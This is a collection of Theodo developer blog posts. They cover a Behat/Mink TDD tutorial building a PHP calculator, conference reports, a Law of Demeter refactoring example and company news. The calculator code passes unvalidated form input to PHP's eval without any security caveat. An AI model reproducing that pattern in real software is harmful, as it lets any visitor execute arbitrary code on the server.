in the feature/bootstrap/FeatureContext.php file. Luckily, MinkExtension provides these definitions with the MinkContext class, so lets use it.\nBefore going further we will have to configure Behat through the behat.yml file:\n# behat.yml\r\ndefault:\r\n    extensions:\r\n        Behat\\MinkExtension\\Extension:\r\n            base_url: 'http://127.0.0.1:4042' # this will be the url of our application\r\n            goutte: ~\nThen register the MinkContext as a subcontext in the FeatureContext class that Behat generated for you:\n// features/bootstrap/FeatureContext.php\r\n...\r\nuse Behat\\MinkExtension\\Context\\MinkContext;\r\n\r\n/**\r\n * Features context.\r\n */\r\nclass FeatureContext extends BehatContext\r\n{\r\n    /**\r\n     * Initializes context.\r\n     * Every scenario gets it's own context object.\r\n     *\r\n     * @param array $parameters context parameters (set them up through behat.yml)\r\n     */\r\n    public function __construct(array $parameters)\r\n    {\r\n        $this->useContext('mink', new MinkContext());\r\n    }\r\n}\nNow if we run \u201cbin/behat -dl\u201d we will see the list of step definitions that our context is aware of.\nThen running \u201cbin/behat\u201d you should see the first step fail:\nFeature: Calculator calculates operations and returns it to you\r\n\r\n  Scenario: Calculate 1+1 and return 2             # features/calculator.feature:3\r\n\r\n    Given I am on \"/index.php\"                     # Behat\\MinkExtension\\Context\\MinkContext::visit()\r\n      [curl] 7: couldn't connect to host [url] http://127.0.0.1:4042/index.php\r\n    When I fill in \"operation\" with \"1+1\"          # Behat\\MinkExtension\\Context\\MinkContext::fillField()\r\n    And I press \"Ok\"                               # Behat\\MinkExtension\\Context\\MinkContext::pressButton()\r\n    Then I should see \"2\" in the \"#result\" element # Behat\\MinkExtension\\Context\\MinkContext::assertElementContainsText()\r\n\r\n1 scenario (1 failed)\r\n4 steps (3 skipped, 1 failed)\r\n0m0.031s\nTo make the first step pass we have to make the \u201c/index.php\u201d url point to a real index.php file. Then you have to make Behat (throught Mink and Goutte) able to access this file. To do so you can setup a virtual host, but if you don\u2019t want to spend most of your time setting it up you should open another tab in your console, download Symfttpd and add the following symfttpd.conf.php file in your project:\n<?php\r\n// symfttpd.conf.php\r\n\r\n$options['project_type'] = 'php';\r\n$options['project_web_dir'] = '.';\nNote that you will need Lighttpd to be installed on your machine (to use Nginx with PHP-FPM run the command \u201cpath/to/symfttpd/bin/symfttpd init\u201d).\nOnce Symfttpd is configured, run the following command:\n~/calculator $ php symfttpd.phar spawn -t\r\nSymfttpd - version 2.1.4\r\nlighttpd started on 127.0.0.1, port 4042.\r\n\r\nAvailable applications:\r\nhttp://127.0.0.1:4042/index.php\r\n\r\nPress Ctrl+C to stop serving.\nIf everything is going right you can now run the scenario again:\n~/calculator $ bin/behat\r\nFeature: Calculator calculates operations and returns it to you\r\n\r\n  Scenario: Calculate 1+1 and return 2 # features/calculator.feature:3\r\n    Given I am on \"/index.php\" # Behat\\MinkExtension\\Context\\MinkContext::visit()\r\n    When I fill in \"operation\" with \"1+1\" # Behat\\MinkExtension\\Context\\MinkContext::fillField()\r\n    Form field with id|name|label|value \"operation\" not found.\r\n    And I press \"Ok\" # Behat\\MinkExtension\\Context\\MinkContext::pressButton()\r\n    Then I should see \"2\" in the \"#result\" element # Behat\\MinkExtension\\Context\\MinkContext::assertElementContainsText()\r\n\r\n1 scenario (1 failed)\r\n4 steps (1 passed, 2 skipped, 1 failed)\r\n0m1.154s\nNow the first step is green, this means it passed, but the second one failed: \u201cForm field with id|name label|value \u201coperation\u201d not found.\u201d It means that we have some minimal code to write.\n\n\nGreen bar\nIn TDD we follow simple rules:\n\n\nwrite a simple test\nrun all tests and fail\nmake a change\nrun the tests and succeed\nfinally refactor\n\n\nThe first step is already done since we wrote our scenario, and as we ran it and saw it fail step two is already done as well. Let\u2019s make a change then.\nTo make the scenario succeed we need to write some html in the index.php file:\n<html>\r\n        <body>\r\n                <form action=\"/\" method=\"post\">\r\n                        <input type=\"text\" name=\"operation\" />\r\n                        <button type=\"submit\">Ok</button>\r\n                </form>\r\n        </body>\r\n</html>\nThen run Behat again:\n~/calculator $ bin/behat\r\nFeature: Calculator calculates operations and returns it to you\r\n\r\n  Scenario: Calculate 1+1 and return 2             # features/calculator.feature:3\r\n    Given I am on \"/\"                              # Behat\\MinkExtension\\Context\\MinkContext::visit()\r\n    When I fill in \"operation\" with \"1+1\"          # Behat\\MinkExtension\\Context\\MinkContext::fillField()\r\n    And I press \"Ok\"                               # Behat\\MinkExtension\\Context\\MinkContext::pressButton()\r\n    Then I should see \"2\" in the \"#result\" element # Behat\\MinkExtension\\Context\\MinkContext::assertElementContainsText()\r\n    Element matching css \"#result\" not found.\r\n\r\n1 scenario (1 failed)\r\n4 steps (3 passed, 1 failed)\r\n0m0.048s\nTwo steps closer to success! The latest step is still failing, so to make it pass we will complete our HTML with hardcoded value (remember the TDD philosophy: find the simplest way to make the tests pass):\n<html>\r\n        <body>\r\n                <form action=\"/\" method=\"post\">\r\n                        <input type=\"text\" name=\"operation\" />\r\n                        <button type=\"submit\">Ok</button>\r\n                </form>\r\n\r\n                <div id=\"result\">2</div>\r\n        </body>\r\n</html>\nThen \u2026 you guessed it\u2026 run Behat:\n~/calculator $ bin/behat\r\nFeature: Calculator calculates operations and returns it to you\r\n\r\n  Scenario: Calculate 1+1 and return 2             # features/calculator.feature:3\r\n    Given I am on \"/\"                              # Behat\\MinkExtension\\Context\\MinkContext::visit()\r\n    When I fill in \"operation\" with \"1+1\"          # Behat\\MinkExtension\\Context\\MinkContext::fillField()\r\n    And I press \"Ok\"                               # Behat\\MinkExtension\\Context\\MinkContext::pressButton()\r\n    Then I should see \"2\" in the \"#result\" element # Behat\\MinkExtension\\Context\\MinkContext::assertElementContainsText()\r\n\r\n1 scenario (1 passed)\r\n4 steps (4 passed)\r\n0m0.041s\nGreen bar!! Ok this was the fourth step of our TDD process (run the tests and succeed), easy isn\u2019t it?!\nTo go further we need to think about our calculator. Adding 1 to 1 was simple and we did it quite easily, but what if we want to add 2 to 3? Write the feature:\n# feature/calculator.feature# ...Scenario: Calculate 2+3 and return 5\r\n        Given I am on \"/\"When I fill in \"operation\" with \"2+3\"And I press \"Ok\"Then I should see \"5\" in the \"#result\" element\nOf course, running Behat again, this scenario will fail as we hardcoded the result in our HTML. So we will need to change it without breaking the first scenario\u2026\nHere is the code:\n<?php\r\n\r\n$result = \"\";\r\n\r\n// The operation was submitted\r\nif (!empty($_POST)) {\r\n        $operation = $_POST['operation'];\r\n\r\n        $result = eval(\"return $operation;\");\r\n}\r\n\r\n?>\r\n\r\n<html>\r\n        <body>\r\n                <form action=\"/\" method=\"post\">\r\n                        <input type=\"text\" name=\"operation\" />\r\n                        <button type=\"submit\">Ok</button>\r\n                </form>\r\n\r\n                <div id=\"result\"><?php echo $result ?></div>\r\n        </body>\r\n</html>\nRunning Behat, everything is ok.\n\n\nDoes your calculator do something else than addition?\nYes! I will prove it! Add the following scenarios and run Behat again:\n# features/calculator.featureFeature:\r\n\r\n    # ...\r\n\r\n    Scenario: Calculate 10-5 and return 5\r\n        Given I am on \"/\"\r\n        When I fill in \"operation\" with \"10-5\"And I press \"Ok\"Then I should see \"5\" in the \"#result\" elementScenario: Calculate 2*3 and return 6\r\n        Given I am on \"/\"When I fill in \"operation\" with \"2*3\"And I press \"Ok\"Then I should see \"6\" in the \"#result\" elementScenario: Calculate 4/2 and return 2\r\n        Given I am on \"/\"When I fill in \"operation\" with \"4/2\"And I press \"Ok\"Then I should see \"2\" in the \"#result\" element\n~/calculator $ bin/behat --format=progress\r\n................................\r\n\r\n5 scenarios (5 passed)\r\n20 steps (20 passed)\r\n0m0.155s\nSo yes, our calculator can add, substract, multiply and divide.\n\n\nRefactor: step 5 of TDD\nAdding scenarios for each type of calculation we duplicate steps, let\u2019s see how to keep our feature small but readable, using Scenario outlines:\nFeature: Calculator calculates operations and returns it to you\r\n\r\n    Scenario Outline: Calculate an operation and print the result\r\n        Given I am on \"/\"\r\n        When I fill in \"operation\" with \"<operation>\"And I press \"Ok\"Then I should see \"<result>\" in the \"#result\" elementExamples:\r\n        | operation | result |        | 1+1       | 2      |        | 2+3       | 5      |        | 10-5      | 5      |        | 2*3       | 6      |        | 4/2       | 2      |\nRun Behat:\n~/calculator $ bin/behat --format=progress\r\n............................\r\n\r\n5 scenarios (5 passed)\r\n20 steps (20 passed)\r\n0m0.135s\nMuch cleaner, isn\u2019t it? Yes, but we can improve its quality a little bit more. We tested that 1+1 equals 2 and 2+3 equals 5, we can remove one of these examples as it is quite the same.\n\n\nUp to you!\nIf you want to go further you may add some functionalities to our Calculator. Improve the web interface, add buttons, separate view from controller\u2026\nHere are some links to go further with Behat, Mink and Gherkin.\nFinally, if you are interested in BDD you should read this now classic blog post from Dan North\u2019s blog and to learn more about TDD you should read the \u201cTest-Driven Development by example\u201d by Kent Beck.\nHope this article will help you start with Behat on your next PHP project!\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTwo weeks ago most of the development team was at Symfony Live in Berlin. It was a pleasure for all of us to be there, meeting core team devs, talking with other Symfony user, seeing Fabrice on stage, speaking about Theodo Evolution with people with similar issues and hacking on TheodoRogerCmsBundle or Symfttpd. So let me tell you what we did there.\nThe talks\nAs there were only one track we didn\u2019t have to choose between two or three conferences. So we attended every one and, as in Paris, found a great balance between Symfony specific talk and others more loosely related.\nIn the first group, I particularly liked Bernhard Schussek brilliantly succeeding at making us become gurus of the Symfony 2 Form component. The form component has a reputation of being one of the most complicated to use, but Bernhard somehow managed to make it look clear and simple. Two other Symfony-related talks addressed one of the current hot topics around Symfony2, especially for us at Theodo: how to integrate Symfony with other projects. First on thursday J\u00e9r\u00f4me Vieilledent exposed how ezPublish integrated the Symfony fullstack framework into the fifth version of their CMS maintaining the backward compatibility. On Friday our CTO Fabrice Bernhard gave the best talk of the two days: Modernisation of legacy PHP applications using Symfony2 (yes I\u2019m totally objective  )\nIn the second group, Johann Peter Hartmann gave some very interesting insight into the classic issue of performance : more often than not, the cause of performance issues lies outside the code. The talk was complete with concrete examples and specific tools to detect the origin of failures. This is closely related to our current concern about devops good practices : web developers need to be aware of the global context of their application deployment. Then Nils Adermann gave us some tricks to properly use Composer and more. If you thought composer was awesome, just have a look at those tricks: it\u2019s even better! A last one I\u2019d like to mention is Tobias Schlitt\u2019s how to make our applications SOLID; beyond the the well known theoretical concepts, he gave us practical ways of achieving a SOLID application. Coding good practices are a special interest of mine, and it is a pleasure to observe the PHP world evolve in this direction.\nThis is exactly what David Coallier expressed in his one-man show of a keynote, convincing us (but weren\u2019t we already ?) that PHP is as good as any other languages and that we should be proud to be members of the PHP community.\nFinally, Fabien Potencier closed the two days with his keynote eplaining that the way we do something is not always the best, he also exposed the fact that today it\u2019s more complicated to start coding than ever before, when the computer started with a command line interface (I have to admit I did not experience this time). That\u2019s why Sensio started building their SensioLabsDesktop application that eases the process to start working on a Symfony project (maybe simple PHP too?).\n\nSymfony certification\nOn Friday morning (day two for those who are lost), while some of us were watching Benjamin Eberlei and Hugo Hamon, others were sitting the Symfony Certification. It was a bit stressful but we are proud to say that Marek and Mathieu passed successfully!\n\nHacking day\nOn saturday we stayed for the hacking day where around 80 people were present to work on Symfony, Symfony CMF, Drupal and other stuff. Marek and some of the Theodo\u2019ers closed somes issues on the TheodoRogerCMS bundle, while I was fixing bugs in the new version of Symfttpd (an other blog post will be available soon). It was also a good opportunity to meet users of the framework, speak about Theodo Evolution, exchanging about modernisation of a legacy project\u2026\nFor most of the team it was our first time in Berlin and we really enjoyed our trip. Moreover we attended great conferences, we brought back a lot of ideas and Symfony goodies (gumbears, stickers, pens, etc\u2026).\nThe nights in Berlin\nNothing happened. Really.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tSensio launched its Symfony2 certification some six month ago, aimed at certifying the deep understanding and practical skills in Symfony2 of the developers who pass it.\nSensio\u2019s CTO Fabien Potencier himself said that \u201cits level is hard!\u201d, and as the time of writing there is a total of only 33 certified developers. Hence, \u00a0even though Benjamin just talked about it in the previous article, I think Marek Kalnik and Mathieu D\u00e4hne deserve a separate short news for being our first two Symfony2 certified developers. So congrats to both of our colleagues, and hopefully some more of our excellent developers will join them soon \n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre-Henri Cumenge\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nThe other day, I stumbled upon the following code that I wrote a few days before.\n\r\n<?php\r\n// src/Foo/BarBundle/Manager/ReportManager.php\r\n\r\nnamespace Foo\\BarBundle\\Manager;\r\n\r\nuse Symfony\\Component\\Security\\Core\\SecurityContextInterface;\r\nuse Symfony\\Component\\Finder\\Finder;\r\n\r\nclass ReportManager\r\n{\r\n    /**\r\n     * @var \\Symfony\\Component\\Security\\Core\\SecurityContextInterface\r\n     */\r\n    protected $securityContext;\r\n\r\n    /**\r\n     * @var String\r\n     */\r\n    protected $baseDir;\r\n\r\n    /**\r\n     * @param string                                                    $directory\r\n     * @param \\Symfony\\Component\\Security\\Core\\SecurityContextInterface $context\r\n     */\r\n    public function __construct($directory, SecurityContextInterface $context)\r\n    {\r\n        $this->baseDir         = $directory;\r\n        $this->securityContext = $context;\r\n    }\r\n\r\n    /**\r\n     * Returns files for a specific year.\r\n     *\r\n     * @param int $year\r\n     *\r\n     * @return array\r\n     */\r\n    public function getFiles($year)\r\n    {\r\n        if (null == $this->securityContext->getToken()) {\r\n            throw new \\Exception('There is no token in the security context');\r\n        }\r\n\r\n        $company = $this->securityContext->getToken()->getUser()->getSelectedCompany();\r\n\r\n        $finder = new Finder();\r\n        $finder->files()->in($this->baseDir.\"/$year/{$company->getCode()}\");\r\n\r\n        return iterator_to_array($finder, false);\r\n    }\r\n}\r\n\nHere is the service definition in the FooBarBundle.\n\r\n# src/Foo/BarBundle/Resources/config/services.yml\r\n\r\nparameters:\r\n    manager.report.class: Foo\\BarBundle\\Manager\\ReportManager\r\n\r\nservices:\r\n    manager.report:\r\n        class: %manager.report.class%\r\n        arguments:\r\n            - 'path/to/reports'\r\n            - @security.context\r\n\nThe usage of this class is really simple: you call the method\ngetFiles of the service in any part of your application an you\u2019ll get an\narray of files. Here is an example in a controller:\n\r\n// src/Foo/BarBundle/Controller/ReportController.php\r\n\r\n// ... lot of code in your controller\r\npublic function listAction($year)\r\n{\r\n    $files = $this->get('manager.report')->getFiles(date('Y'));\r\n\r\n    return new Response($this->renderView(\r\n        'FooBarBundle:Report:list.html.twig',\r\n        array('files' => $files)\r\n    ));\r\n}\r\n\nHere is my question, can you guess what\u2019s wrong in all this code? \u2026 Ok that\u2019s\nnot really obvious at first. The problem in this code is the ReportManager\nclass.\nFirst of all it is in the Namespace Foo\\BarBundle\\Manager. \"Manager\" does\nnot mean anything except that every classes contained in this namespace\nmanages things. The name is not really well chosen, it could have been\nFoo\\BarBundle\\FileManager instead, or the file could have been directly in\nthe Foo\\BarBundle namespace.\nBut it\u2019s not the main problem\u2026 It appeared to me when I decided to test it\n(I should have done it really earlier) after adding some code to this class.\nHere is the test I started to write:\n\r\n<?php\r\n\r\nnamespace Foo\\BarBundle\\Tests\\Manager;\r\n\r\nuse Foo\\BarBundle\\Manager\\ReportManager;\r\n\r\nclass ReportManagerTest extends \\PHPUnit_Framework_TestCase\r\n{\r\n    public function testGetFiles()\r\n    {\r\n        $company = $this->getMock('Foo\\BarBundle\\Entity\\Company');\r\n        $company->expects($this->once())\r\n            ->method('getCode')\r\n            ->will($this->returnValue('foo'));\r\n\r\n        $user = $this->getMock('Symfony\\Component\\Security\\Core\\User\\UserInterface');\r\n        $user->expects($this->once())\r\n            ->method('getSelectedCompany')\r\n            ->will($this->returnValue($company));\r\n\r\n        $token = $this->getMock('Symfony\\Component\\Security\\Core\\Authentication\\Token\\TokenInterface');\r\n        $token->expects($this->once())\r\n            ->method('getUser')\r\n            ->will($this->returnValue($user));\r\n\r\n        $securityContext = $this->getMock('Symfony\\Component\\Security\\Core\\SecurityContextInterface');\r\n        $securityContext->expects($this->exactly(2))\r\n            ->method('getToken')\r\n            ->will($this->returnValue($token));\r\n\r\n        $reportManager = new ReportManager('bar', $securityContext);\r\n        $this->assertCount(0, $reportManager->getFiles(2013));\r\n    }\r\n}\r\n\nDo you see what the problem is with the ReportManager class now?\nHave you ever heard about the Law of Demeter? Well that\u2019s the perfect moment to\nintroduce it to you. The Law of Demeter is a development design principle\nwhich states that an object\u2019s method should only interact with:\n\nthe object itself\nthe method\u2019s parameters\nany object created within the method or the object\u2019s component objects (parents etc.).\n\nBasicaly, an object A can interact with an object B but cannot use it to get an object C.\nObviously, the code I wrote did not respect this principle at all! I injected\nthe SecurityContext in the constructor to use it in the getFiles method\nI needed it because the context allowed me to have the current connected User through\nthe Token and then, calling the getSelectedCompany, I could have the company\u2019s code.\nWhy did I do that? Well because injecting the SecurityContext is the only\nway to retrieve the connected user. And with this user I can retrieve the\ncurrent selected company\u2019s code.\nSo do you think that the injection was well chosen? Surely not, and it\u2019s not\nneeded either. The unit test shows that because I need to mock 4 objects to\nhave a simple string (the code) in the getFiles method.\nSeeing this, I immediatly refactored it this way:\n\r\n<?php\r\n\r\nnamespace Foo\\BarBundle\\Manager;\r\n\r\nuse Symfony\\Component\\Finder\\Finder;\r\n\r\nclass ReportManager\r\n{\r\n\r\n    /**\r\n     * @var String\r\n     */\r\n    protected $baseDir;\r\n\r\n    /**\r\n     * @param string $directory\r\n     */\r\n    public function __construct($directory)\r\n    {\r\n        $this->baseDir = $directory;\r\n    }\r\n\r\n    /**\r\n     * Returns files for a specific year.\r\n     *\r\n     * @param int    $year\r\n     * @param string $code The company code\r\n     *\r\n     * @return array\r\n     */\r\n    public function getFiles($year, $code)\r\n    {\r\n        $finder = new Finder();\r\n        $finder->files()->in($this->baseDir.\"/$year/{$code}\");\r\n\r\n        return iterator_to_array($finder, false);\r\n    }\r\n}\r\n\nThen I updated the service definition accordingly to these changes, I removed\nthe dependency to the security.context service:\n\r\nservices:\r\n    manager.report:\r\n        class: %manager.report.class%\r\n        arguments:\r\n            - 'path/to/reports'\r\n\nAnd I moved the logic that retrieves the company\u2019s code into the controller:\n\r\n// src/Foo/BarBundle/Controller/ReportController.php\r\n\r\n// ... lot of code in your controller\r\npublic function listAction($year)\r\n{\r\n    $company = $this->getUser()->getSelectedCompany();\r\n    $files = $this->get('manager.report')->getFiles(date('Y'),$company->getCode());\r\n\r\n    return new Response($this->renderView(\r\n        'FooBarBundle:Report:list.html.twig',\r\n        array('files' => $files)\r\n    ));\r\n}\r\n\nThen the test looks much cleaner:\n\r\n<?php\r\n\r\nnamespace Foo\\BarBundle\\Tests\\Manager;\r\n\r\nuse Foo\\BarBundle\\Manager\\ReportManager;\r\n\r\nclass ReportManagerTest extends \\PHPUnit_Framework_TestCase\r\n{\r\n    public function testGetFiles()\r\n    {\r\n        $reportManager = new ReportManager('bar');\r\n        $this->assertCount(0, $reportManager->getFiles(2013, 'foo'));\r\n    }\r\n}\r\n\nThis mistake led me to 2 conclusions:\nFirst, it is another point in favor of TDD: had I TDD\u2019ed the whole thing, I would never\nhave written such over-complicated code\u2026  And second, you should not overuse dependency\ninjection, its ease of use makes it sometimes the obvious solution, but not the simplest\nnor the best one. So next time you add a dependency, just pause for half a second and\nask yourself: is it really necessary ?\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t \nWe are happy and proud to announce the victory of LaFourchette.com mobile website in the \u201cM site\u201d contest!\nhttp://www.lemsitedelannee.fr/Gagnants.aspx (FR)\nThe application has been designed by LaFourchette and developed by Theodo.\nWhat is LaFourchette.com?\nThe purpose of LaFourchette.com are to offer to its users a fast way to discover restaurants near a specified localization, and book a table from the application. The service \u2014 thanks to partnerships with restaurants \u2014, also provides special offers, like a free drink or a discount.\nWhat is the \u201cM site\u201d contest?\nThis is a competition between several mobile websites of French companies. The contest is organized by Google, Les Echos (a French daily newspaper) and MMAF, for Mobile Marketing Association France.\nThe jury is composed of the MMAF president, the Virgin Mobile CEO and the Echos chief editor.\nDuring a month, the applications were judged on several criteria, as ease and speed of browsing, use of geolocation, accessibility on different kind of mobile devices and adaptation to touch technologies.\nTheodo\u2019s contribution\nLaFourchette.com realized that a significant amount of people was browsing on the main website from their mobile phones, even though Android and iPhone apps were both available. So, they decided to design a mobile website, and asked Theodo to develop it.\nThe project has been divided in three steps, and developed in almost three months by Pierre-Henri Cumenge as Lead Developer, and me \u2014 R\u00e9my Luciani. Julien Laure was Product Manager on this work. The three of us\u00a0worked in an agile way, with stand-up meetings every morning, and \u2014 of course \u2014, with Theodo Spot, our project management tool, in order to place LaFourchette requirements at the center of the development.\nFurthermore, the application has been developed with Symfony2 and Twig. It was pleasant to develop this app, and proves that Symfony2 does the job well also for mobile websites!\n\nFinally, Theodo would like to thank LaFourchette.com for this experience and their nice design of the mobile site. Congratulations!\n\nMore infos on Les Echos : http://blogs.lesechos.fr/techosphere/le-prix-du-m-site-de-l-annee-decerne-a-la-fourchette-a11198.html\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRemy Luciani\r\n  \t\t\t\r\n  \t\t\t\tTheodoer since 2011, Architect/Developer & Coach. DevOps enthusiast. \r\n\r\n\"The Prod is life!\"  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis blog post is in French as the event it relates to is French-only.\n\u00a0\nTheodo accueille le prochain sfPot dans ses tout nouveaux locaux le 8 octobre.\nAlexandre Salom\u00e9 nous parlera des performances du framework Symfony2 : chargement des classes, d\u00e9pendances, services, cache applicatif\u2026 Un sujet (ou un orateur ?) qui int\u00e9resse manifestement beaucoup de monde, puisque les 70 places propos\u00e9es sont d\u00e9j\u00e0 parties ! (Il est encore possible de s\u2019inscrire sur la liste d\u2019attente).\nLa pr\u00e9sentation sera suivie d\u2019un pot sur place, offert par Theodo (bi\u00e8re pression incluse !)\nD\u00e9tails pratiques :\nDate : le 8 octobre \u00e0 partir de 19H00\nInscriptions : closes pour l\u2019instant (http://www.eventbrite.com/event/4428754524 pour la liste d\u2019attente)\nAdresse : 48 Boulevard des Batignolles 75017 Paris\nM\u00e9tros :\n\nligne 2, Rome\nligne 13, Place de Clichy\nligne 3, Europe\nligne 12 et 14, Saint-Lazare (+10min \u00e0 pied)\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre-Henri Cumenge\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen I started working at Theodo, in october 2009 (indeed, nearly 3 years ago :)), we were 6 people. Now, Theodo is an awesome team of 20 theodoers[1], each with a different profile (still working hard ;)), and many more will be coming in the next months.\u00a0Our current office, at Rue Notre Dame des Victoires in Paris, is already too small! That is why, by the end of september, we will move to our new gigantic place at\u00a0Boulevard des Batignolles. Yes I\u00a0wrote \u201cgigantic\u201d because we are not used to large places like this:\n\n2 floors:\n\n1st floor: 120m2\n2nd floor: 300m2 (our\u00a0tv will be too small!)\n\n\n48 places for developers\n2 open spaces\n3 meeting rooms\na large caf\u00e9teria with seats to take coffee and discuss\n\u2026\n\nWe will be able to receive some\u00a0sfpot meetups or php rendez-vous with a lot of attendees!\nFinally, you may have noticed that a large part of this place will be empty at first so you (yes, you, brilliant PHP developer) must\u00a0apply, as we are recruiting \ud83d\ude09\n[1] \u201ca doer: a person who gets things done.\u201d http://www.yourdictionary.com/doer\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nAs a silver sponsor, we attended Forum PHP on June 5th and 6th. There is a lot to tell about it but for now here\u2019s a quick review of the conferences we went to.\n\n\nOn Tuesday:\n\nRasmus Lerdorf brought back the history of PHP and covered all the brand new features of PHP 5.4\nRafael Dohms explained what annotations are\nBenjamin Clay and Damien Alexandre, aka the \u201cRainbros\u201d, spoke about LAMP alternatives\nKenny DITS shared the results of their experiments with application monitoring using Statsd and Graphite\nJulien PAULI dived into core anatomy of PHP: how it works\nJean-Marc Fontaine listed all methods, including Composer, to implement external libraries in a PHP project\nBesides, lightning talks were introduced for the very first time at a Forum PHP event, carried along by following participants:\nGuillaume Plessis (Hip Hop)\nPatrick Allaert (error handling with APM extension for PHP)\nChristophe Villeneuve (password management)\nFabrice Bernhard (Relaunch of applications written in PHP with Theodo Evolution)\nS\u00e9bastien Lucas (entrepreneurship in a PHP world)\nGerald CROES introduced Phing, the PHP version of Ant\n\n\n\nOn Wednesday:\n\nJ\u00e9r\u00f4me Renard explained how to use varnish with PHP application\nPatrick Allaert spoke about PHP native data types, and more specifically arrays and their alternatives\nBastien Jaillot and Simon Perdrisat introduced us Drupal and third software use in Drupal\nEnrico Zimuel present a build of simple web application with Zend Framework 2\nAmaury Bouchard plunged us into the daemons, starting from initd to the viability of using PHP\nJ\u00e9r\u00f4me Vieilledent talked about concurrency and scalability in PHP applications and provided us with personal insights\nAnother new idea was \u201cthe CTO roundtable\u201d during which they talked about the general use of PHP within large companies\n\n\n\nIn a nutshell, the first class conferences we had the privilege to attend led us to believe we\u2019ll surely renew the experience next year.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlix Chaysinh\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
